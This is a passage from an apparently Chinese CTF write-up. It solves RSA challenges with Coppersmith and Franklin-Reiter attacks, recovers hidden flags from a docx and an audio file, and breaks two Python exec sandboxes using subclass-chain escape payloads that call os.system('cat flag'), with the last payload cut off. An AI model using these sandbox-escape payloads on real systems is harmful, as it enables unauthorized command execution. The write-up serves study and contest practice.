7100211561130020745317757673987451075767374867154791943756942873384127138552062792930795789238580479594394979173335338862606838173069964831049512647184151</span></span><br><span class="line"><span class="string">r2 = 9000155708454100491902006607890753523170880329077738766151247940110441586305244492413508062919425173224196956216820961804625696491943075045460554703545531</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>看晕了……</p>
<h2 id="⛏️-铜匠的艺术Ⅰ"><a href="#⛏️-铜匠的艺术Ⅰ" class="headerlink" title="⛏️ 铜匠的艺术Ⅰ"></a>⛏️ 铜匠的艺术Ⅰ</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() &lt; <span class="number">512</span></span><br><span class="line">N = <span class="number">1024</span></span><br><span class="line">P = <span class="number">256</span></span><br><span class="line">p = getPrime(P)</span><br><span class="line">q = getPrime(N-P)</span><br><span class="line">n = p * q</span><br><span class="line">d = p</span><br><span class="line">e = inverse(d, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 118542873900747265901972229877883243863455720266210015956664954705111625457638899855027122945522479781037404808597170399339837193705757680088860677997958907356598337673929983523887709805385841477614948436454673040596579313465066950050748901502261100925866106567136278276272183814389727065752049737673528788851</span></span><br><span class="line"><span class="string">c = 85091710660465995062917932706421029612933738881922031822674968124253137988309351810508978584348197911485561426918031817399685522559286375310408913518074664331882588344176796591922444160725511070449908851983275493777666568865120499654769828318792734657142197271358769027319683651960777955741591424859221331570</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>铜匠攻击<code>coppersmith</code><br><a target="_blank" rel="noopener" href="https://jayxv.github.io/2020/08/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bcoppersmith/">https://jayxv.github.io/2020/08/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bcoppersmith/</a><br>应用到了<code>boneh durfee attack</code>，问题是<code>e</code>未知<br><a target="_blank" rel="noopener" href="https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage">https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage</a></p>
<p><code>Lazzaro</code>佬的总结<a target="_blank" rel="noopener" href="https://www.cnblogs.com/404p3rs0n/p/15542587.html">https://www.cnblogs.com/404p3rs0n/p/15542587.html</a><br>问了一下出题人，讲了一下想法，没有理我……</p>
<p>时隔半年，混成密码老手再来看这题，也是直接提取到关键信息了，<code>unbalanced rsa</code>，而且<code>d=p</code>是可以利用的，先看看<a target="_blank" rel="noopener" href="https://blog.maple3142.net/2021/12/07/hitcon-ctf-2021-writeups/#a-little-easy-rsa">弱化版本</a><br>如果题目给出<code>e</code>的话，$e<em>n\equiv e</em>p<em>q\equiv q\equiv e</em>d<em>q\equiv q\ mod\ \phi(n)$<br>$2^{e</em>n}\equiv 2^{q}\ mod\ n$<br>$2^{e<em>n}\equiv 2^{q}\equiv 2\ mod\ q$<br>$q=GCD(2^{e</em>n}-2,n)$</p>
<p>强化版，不给<code>e</code><br>$c’\equiv m^{e*n}\equiv m\ mod\ q$<br><img src="https://picx.zhimg.com/80/v2-a4f09065668c095334e1bdd1a7478fab_1440w.png" alt=""></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">118542873900747265901972229877883243863455720266210015956664954705111625457638899855027122945522479781037404808597170399339837193705757680088860677997958907356598337673929983523887709805385841477614948436454673040596579313465066950050748901502261100925866106567136278276272183814389727065752049737673528788851</span></span><br><span class="line">c = <span class="number">85091710660465995062917932706421029612933738881922031822674968124253137988309351810508978584348197911485561426918031817399685522559286375310408913518074664331882588344176796591922444160725511070449908851983275493777666568865120499654769828318792734657142197271358769027319683651960777955741591424859221331570</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = <span class="built_in">pow</span>(c, n, n) - x</span><br><span class="line">f = f.monic()</span><br><span class="line">res = f.small_roots(beta=<span class="number">0.67</span>, epsilon=<span class="number">0.04</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(res[<span class="number">0</span>])).decode())</span><br></pre></td></tr></table></figure>
<h2 id="😋-叒是欧几里得"><a href="#😋-叒是欧几里得" class="headerlink" title="😋 叒是欧几里得"></a>😋 叒是欧几里得</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() &lt; <span class="number">240</span></span><br><span class="line">p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">127</span></span><br><span class="line">delta = getPrime(<span class="number">1024</span>)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m + delta * randint(<span class="number">1</span>, <span class="number">16</span>), e, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m + delta * randint(<span class="number">1</span>, <span class="number">16</span>), e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;delta =&#x27;</span>, delta)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c1 =&#x27;</span>, c1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c2 =&#x27;</span>, c2)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 79724747744041714288953392952463874801997705081106902943284648733918149185753839937134265686183985428507199115581472568110843698105733584732275660165830029909359483267387801214496783177450040180595781619052234234214466384716761078975184418283511523324752507723140024391761761919034003871792556646981516016829</span></span><br><span class="line"><span class="string">delta = 126231068620420223973893815509531523980528675989214589653267161043503977208634759494599578611297423840582424158720324586085466134446749572141985881213834874797105681653543775703457635235713661837619943424874322621237629070789752447854720667927421977431676296802472297153819769740875671325555175485801487562317</span></span><br><span class="line"><span class="string">c1 = 36578233020971843140854855402047493686821205871189638550273647983442002301763881467104013416020830811359646176983834496945892080167342879776467612198963515145695205542184908041221340742020262320462349152920227384763155486786470112042989101020262194775511567104383189663255042081708258269604855798589456059252</span></span><br><span class="line"><span class="string">c2 = 217496152646372905195410265855757862997908815896427895285321483108430164363119052551898699474219390009044650355199849989937145012074237320274174148963137082335030402537136022883092093136277846069764849794019465924895060791502105277845493988301747611257009487302383938540250170857241135318332565447081257370</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">franklinReiter</span>(<span class="params">n, e, b, c1, c2</span>):</span><br><span class="line">    R.&lt;X&gt; = Zmod(n)[]</span><br><span class="line">    f1 = X ^ e - c1</span><br><span class="line">    f2 = (X + b) ^ e - c2</span><br><span class="line">    <span class="comment"># 返回的是首一多项式，coefficients()返回多项式各项式的系数，项式次数递增，所以第0项是常数</span></span><br><span class="line">    m_ = GCD(f1, f2).coefficients()[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> Integer(n - m_)  <span class="comment"># 由于tmp其实是 -m % n,所以这里给他转换回去。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GCD</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> a.monic()<span class="comment"># 返回首一多项式，即多项式最高次的项式系数为1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> GCD(b, a % b)</span><br><span class="line">e = <span class="number">127</span></span><br><span class="line">n = </span><br><span class="line">c1 = </span><br><span class="line">c2 = </span><br><span class="line">delta = </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    M = franklinReiter(n, e, i*delta, c1, c2)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        flag=long_to_bytes((M-j*delta+n)%n)</span><br><span class="line">        <span class="comment"># 防止 M-j*delta 是负数</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;cnss&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>翻阅学习<code>coppersmith</code>时学到的，<a target="_blank" rel="noopener" href="https://jayxv.github.io/2020/08/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bcoppersmith/">https://jayxv.github.io/2020/08/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bcoppersmith/</a>，<code>Van1sh</code>Orzz，实例第五关</p>
<p>$c1=(m+r_{1})^{e}mod\ n$<br>$c2=(m+r_{2})^{e}mod\ n$<br>$M_{1}=m+r_{1}$<br>$M_{2}=m+r_{2}=M_{1}+r=f(M_{1})$</p>
<p>$X^{e}-c1\equiv 0(mod\ n)$<br>$f(X)^{e}-c2\equiv 0(mod\ n)$<br>$对于这两个多项式，有一个公共解：M_{1}$</p>
<p>$多项式除法的基本定理，即因子定理$<br>$如果P(X)是一个多项式，且M_{1}是一个数使得P(M_{1})=0，那么X−M_{1}是P(X)的一个因子$<br>$即，存在另一个多项式Q(X)，使得P(X)=(X-M_{1})Q(X)$</p>
<p>$那么有，(X-M_{1})Q(X_{1})\equiv 0(mod\ n)$<br>$(X-M_{1})Q(X_{2})\equiv 0(mod\ n)$<br>$根据单调性可知，方程有唯一解M_{1}，则Q(X_{i})不可再因式分解，彼此互素$<br>$对俩多项式GCD，得到X-M_{1}，但模n的情况下，得到X+M’的形式$<br>$M’=-M_{1}(mod\ n)，最终，M=-M’(mod\ n)$<br>$第一次爆破，是对M_{1}M_{2}的差值进行爆破$<br>$最后，对M_{1}进行随机数爆破，得到$</p>
<p><code>cnss&#123;Half-GCD 1s so u5eful!&#125;</code><br>考点<code>Related Message Attack</code></p>
<h2 id="⚽-Permutation"><a href="#⚽-Permutation" class="headerlink" title="⚽ Permutation()"></a>⚽ Permutation()</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">P = Permutations(<span class="number">256</span>).random_element()</span><br><span class="line"><span class="built_in">print</span>(P**<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>([x^y <span class="keyword">for</span> x,y <span class="keyword">in</span> <span class="built_in">zip</span>(hashlib.sha512(<span class="built_in">str</span>(P).encode()).digest(), flag)])</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[37, 12, 147, 180, 109, 42, 193, 61, 114, 167, 89, 229, 47, 30, 139, 226, 238, 200, 152, 210, 201, 103, 236, 130, 53, 16, 132, 39, 64, 29, 99, 36, 8, 4, 124, 58, 145, 54, 211, 223, 242, 146, 234, 43, 143, 235, 173, 231, 62, 115, 121, 9, 131, 102, 255, 49, 217, 24, 17, 212, 21, 117, 163, 172, 28, 68, 233, 25, 166, 67, 137, 136, 122, 207, 196, 222, 106, 128, 108, 156, 74, 220, 33, 83, 120, 45, 76, 170, 104, 133, 78, 254, 57, 191, 183, 181, 253, 123, 112, 134, 96, 44, 240, 195, 6, 82, 216, 7, 192, 111, 189, 190, 71, 98, 70, 218, 127, 251, 155, 256, 159, 19, 151, 252, 113, 116, 59, 160, 239, 92, 148, 202, 169, 248, 129, 203, 187, 27, 23, 153, 13, 162, 144, 51, 38, 10, 41, 107, 81, 186, 177, 164, 204, 20, 161, 157, 52, 224, 119, 14, 228, 72, 250, 69, 140, 101, 214, 205, 174, 77, 118, 232, 86, 176, 219, 91, 215, 60, 158, 197, 194, 221, 2, 94, 87, 88, 245, 80, 154, 5, 165, 40, 79, 150, 26, 126, 15, 3, 105, 175, 48, 50, 55, 206, 237, 90, 149, 184, 243, 31, 65, 11, 182, 84, 18, 199, 141, 85, 225, 142, 66, 185, 178, 179, 125, 93, 247, 75, 208, 171, 97, 246, 227, 46, 1, 34, 209, 110, 56, 22, 32, 135, 168, 244, 230, 95, 138, 73, 249, 100, 35, 63, 213, 241, 198, 188]</span></span><br><span class="line"><span class="string">[218, 197, 209, 36, 168, 67, 208, 21, 66, 22, 197, 141, 81, 24, 174, 245, 184, 56, 60, 64, 228, 224, 33, 91, 234, 61, 68, 241, 222, 169, 216, 172, 219, 43, 39, 37, 249, 11]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>我怀疑这题数据给错了，但有人做出来了……</p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="🙈-尔辈不能究物理"><a href="#🙈-尔辈不能究物理" class="headerlink" title="🙈 尔辈不能究物理"></a>🙈 尔辈不能究物理</h2><p><code>doc和docx的区别中较大的区别就是文件格式不同，一个是二进制一个为XML格式</code></p>
<p>用解压工具打开，<code>word/media</code><br><img src="https://pic1.zhimg.com/80/v2-8169baae2f6395c06af9a525e9fc72a4_1440w.png" alt=""><br><code>W5_w0RD_Bt_M3!&#125;</code></p>
<p><code>word/embeddings/oleObject21.bIn</code><br><code>010</code>或者记事本打开，发现<br><code>cnss&#123;N0bodY_Kn0</code><br>发现两段<code>flag</code>的生成时间都是比赛开始的前一天晚上</p>
<p><code>flag: cnss&#123;N0bodY_Kn0W5_w0RD_Bt_M3!&#125;</code></p>
<h2 id="✨-星光下的梦想"><a href="#✨-星光下的梦想" class="headerlink" title="✨ 星光下的梦想"></a>✨ 星光下的梦想</h2><p><code>Audacity</code>查看频谱图<br><img src="https://pic1.zhimg.com/80/v2-be9d26046a732d8fab6ecf82c7e33106_1440w.png" alt=""><br>有点模糊，但也试出来了<br><code>CNSS&#123;DR34M~UND3RN347H~5T4R11GH7&#125;</code></p>
<h2 id="⛓️-jailbreak"><a href="#⛓️-jailbreak" class="headerlink" title="⛓️ jailbreak"></a>⛓️ jailbreak</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">jail-<span class="number">0.</span>py</span><br><span class="line"><span class="comment"># FROM python:3.12.3-alpine</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line">BANNER = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">          .?77777777777777$.            </span></span><br><span class="line"><span class="string">          777..777777777777$+           </span></span><br><span class="line"><span class="string">         .77    7777777777$$$           </span></span><br><span class="line"><span class="string">         .777 .7777777777$$$$           </span></span><br><span class="line"><span class="string">         .7777777777777$$$$$$           </span></span><br><span class="line"><span class="string">         ..........:77$$$$$$$           </span></span><br><span class="line"><span class="string">  .77777777777777777$$$$$$$$$.=======.  </span></span><br><span class="line"><span class="string"> 777777777777777777$$$$$$$$$$.========  </span></span><br><span class="line"><span class="string">7777777777777777$$$$$$$$$$$$$.========= </span></span><br><span class="line"><span class="string">77777777777777$$$$$$$$$$$$$$$.========= </span></span><br><span class="line"><span class="string">777777777777$$$$$$$$$$$$$$$$ :========+.</span></span><br><span class="line"><span class="string">77777777777$$$$$$$$$$$$$$+..=========++~</span></span><br><span class="line"><span class="string">777777777$$..~=====================+++++</span></span><br><span class="line"><span class="string">77777777$~.~~~~=~=================+++++.</span></span><br><span class="line"><span class="string">777777$$$.~~~===================+++++++.</span></span><br><span class="line"><span class="string">77777$$$$.~~==================++++++++: </span></span><br><span class="line"><span class="string"> 7$$$$$$$.==================++++++++++. </span></span><br><span class="line"><span class="string"> .,$$$$$$.================++++++++++~.  </span></span><br><span class="line"><span class="string">         .=========~.........           </span></span><br><span class="line"><span class="string">         .=============++++++           </span></span><br><span class="line"><span class="string">         .===========+++..+++           </span></span><br><span class="line"><span class="string">         .==========+++.  .++           </span></span><br><span class="line"><span class="string">          ,=======++++++,,++,           </span></span><br><span class="line"><span class="string">          ..=====+++++++++=.            </span></span><br><span class="line"><span class="string">                ..~+=...     </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># <span class="doctag">TODO:</span> Filter out more dangerous operations</span></span><br><span class="line">FORBIDDEN = [</span><br><span class="line">    ast.Import,</span><br><span class="line">    ast.ImportFrom,</span><br><span class="line">    ast.ClassDef,</span><br><span class="line">    ast.Assign,</span><br><span class="line">]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">c</span>):</span><br><span class="line">    c = ast.parse(c, mode=<span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ast.walk(c):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(i) <span class="keyword">in</span> FORBIDDEN:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="built_in">print</span>(BANNER)</span><br><span class="line">code = <span class="built_in">input</span>(<span class="string">&quot;Enter base64 encoded code: &quot;</span>)</span><br><span class="line">code = base64.b64decode(code.strip()).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(code) &gt; <span class="number">0x1000</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Code too long&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> check(code):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Forbidden operation detected&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    code = <span class="built_in">compile</span>(code, <span class="string">&#x27;&lt;CNSS&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">    <span class="built_in">exec</span>(code, &#123;<span class="string">&#x27;__builtins__&#x27;</span>: &#123;&#125;&#125;)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p><code>nc 156.238.233.117 47800</code><br>经典<code>exec</code>，无回显</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">基于 AST 的沙箱</span><br><span class="line">ast.Import: 表示一个import语句(import os)</span><br><span class="line">ast.ImportFrom: 表示一个from…import…语句</span><br><span class="line">ast.ClassDef: 表示一个类定义 (class A:)</span><br><span class="line">ast.Assign: 表示一个赋值语句(a=1,a=b)</span><br><span class="line"></span><br><span class="line">compile() 函数是一个内置函数，它可以将源码编译为代码或 AST 对象</span><br><span class="line">编译的源码可以是普通的 Python 代码，也可以是 AST 对象</span><br><span class="line">如果它是一个普通的 Python 代码，那么它必须是一个字符串</span><br><span class="line">如果它是一个 AST 对象，那么它将被编译为一个代码对象</span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span> 与 <span class="built_in">exec</span> 的区别再于 <span class="built_in">exec</span> 允许 \n 和 ； 进行换行，而 <span class="built_in">eval</span> 不允许。并且 <span class="built_in">exec</span> 不会将结果输出出来，而 <span class="built_in">eval</span> 会</span><br><span class="line"><span class="built_in">eval</span> 无法直接达到执行多行代码的效果，使用 compile 函数并传入 <span class="built_in">exec</span> 模式就能够实现</span><br><span class="line"></span><br><span class="line">__builtins__：包含当前运行环境中默认的所有函数与类</span><br><span class="line"></span><br><span class="line">它们都可以对命名空间进行限制，这里 &#123;<span class="string">&#x27;__builtins__&#x27;</span>: &#123;&#125;&#125; 直接将命名空间置空，这样就使得内置的函数都无法使用</span><br></pre></td></tr></table></figure>
<p>这样无法导入模块</p>
<p><a target="_blank" rel="noopener" href="https://dummykitty.github.io/python/2023/05/29/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%8E%9F%E7%90%86.html#exec-%E5%87%BD%E6%95%B0">https://dummykitty.github.io/python/2023/05/29/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%8E%9F%E7%90%86.html#exec-%E5%87%BD%E6%95%B0</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/578966149">https://zhuanlan.zhihu.com/p/578966149</a></p>
<p><a target="_blank" rel="noopener" href="https://jbnrz.com.cn/index.php/2024/05/19/pyjail/">https://jbnrz.com.cn/index.php/2024/05/19/pyjail/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.viewofthai.link/2023/05/11/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">https://www.viewofthai.link/2023/05/11/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12647?time__1311=GqGxuDRiYiwxlrzG7DyGQG8D909mL6o3x#toc-22">https://xz.aliyun.com/t/12647?time__1311=GqGxuDRiYiwxlrzG7DyGQG8D909mL6o3x#toc-22</a><br>学习到了还是通过<code>SSTI</code>的本质原理：继承关系逃逸</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">[i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__() <span class="keyword">if</span> i.__name__ == <span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;cat flag&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><code>CNSS&#123;a7_e4sy_p5_ja1l&#125;</code><br>考点<code>pyjail继承链逃逸</code></p>
<h2 id="⛓️-jailbreak-again"><a href="#⛓️-jailbreak-again" class="headerlink" title="⛓️ jailbreak-again()"></a>⛓️ jailbreak-again()</h2><p><code>nc 156.238.233.117 47801</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># FROM python:3.12.3-alpine</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line">BANNER = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">          .?77777777777777$.            </span></span><br><span class="line"><span class="string">          777..777777777777$+           </span></span><br><span class="line"><span class="string">         .77    7777777777$$$           </span></span><br><span class="line"><span class="string">         .777 .7777777777$$$$           </span></span><br><span class="line"><span class="string">         .7777777777777$$$$$$           </span></span><br><span class="line"><span class="string">         ..........:77$$$$$$$           </span></span><br><span class="line"><span class="string">  .77777777777777777$$$$$$$$$.=======.  </span></span><br><span class="line"><span class="string"> 777777777777777777$$$$$$$$$$.========  </span></span><br><span class="line"><span class="string">7777777777777777$$$$$$$$$$$$$.========= </span></span><br><span class="line"><span class="string">77777777777777$$$$$$$$$$$$$$$.========= </span></span><br><span class="line"><span class="string">777777777777$$$$$$$$$$$$$$$$ :========+.</span></span><br><span class="line"><span class="string">77777777777$$$$$$$$$$$$$$+..=========++~</span></span><br><span class="line"><span class="string">777777777$$..~=====================+++++</span></span><br><span class="line"><span class="string">77777777$~.~~~~=~=================+++++.</span></span><br><span class="line"><span class="string">777777$$$.~~~===================+++++++.</span></span><br><span class="line"><span class="string">77777$$$$.~~==================++++++++: </span></span><br><span class="line"><span class="string"> 7$$$$$$$.==================++++++++++. </span></span><br><span class="line"><span class="string"> .,$$$$$$.================++++++++++~.  </span></span><br><span class="line"><span class="string">         .=========~.........           </span></span><br><span class="line"><span class="string">         .=============++++++           </span></span><br><span class="line"><span class="string">         .===========+++..+++           </span></span><br><span class="line"><span class="string">         .==========+++.  .++           </span></span><br><span class="line"><span class="string">          ,=======++++++,,++,           </span></span><br><span class="line"><span class="string">          ..=====+++++++++=.            </span></span><br><span class="line"><span class="string">                ..~+=...     </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># <span class="doctag">TODO:</span> Filter out more dangerous operations</span></span><br><span class="line">FORBIDDEN_AST = [</span><br><span class="line">    ast.Import,</span><br><span class="line">    ast.ImportFrom,</span><br><span class="line">    ast.ClassDef,</span><br><span class="line">    ast.Assign,</span><br><span class="line">    ast.Eq,</span><br><span class="line">]</span><br><span class="line">FORBIDDEN_PATTERNS = [<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;global&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(c) &gt; <span class="number">1000</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Code too long&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> FORBIDDEN_PATTERNS:</span><br><span class="line">        <span class="keyword">if</span> ch <span class="keyword">in</span> c:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Forbidden character found&#x27;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        c = ast.parse(c, <span class="string">&#x27;&lt;CNSS&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Syntax error&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ast.walk(c):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(i) <span class="keyword">in</span> FORBIDDEN_AST:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Forbidden operation found&#x27;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(BANNER)</span><br><span class="line">code = <span class="built_in">input</span>(<span class="string">&#x27;Enter base64 encoded code: &#x27;</span>)</span><br><span class="line">code = base64.b64decode(code.strip()).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">check(code)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    code = <span class="built_in">compile</span>(code, <span class="string">&#x27;&lt;CNSS&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">    <span class="built_in">exec</span>(code, &#123;<span class="string">&#x27;__builtins__&#x27;</span>: &#123;&#125;&#125;)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>进阶版多了<code>ast.Eq</code>，顾名思义把我们的<code>==</code>ban了<br>还多了黑名单<code>&quot; &#39; __ [ ] class global import system</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> ().__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;_wrap_close&quot;</span> <span class="keyword">in</span> x.__name__ ][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">［x［<span class="built_in">str</span>(\<span class="number">137</span>\<span class="number">137</span>\<span class="number">151</span>\<span class="number">156</span>\<span class="number">151</span>\<span class="number">164</span>\<span class="number">137</span>\<span class="number">137</span>)］［<span class="built_in">str</span>(\<span class="number">137</span>\<span class="number">137</span>\<span class="number">147</span>\<span class="number">154</span>\<span class="number">157</span>\<span class="number">142</span>\<span class="number">141</span>\<span class="number">154</span>\<span class="number">163</span>\<span class="number">137</span>\<span class="number">137</span>)］ <span 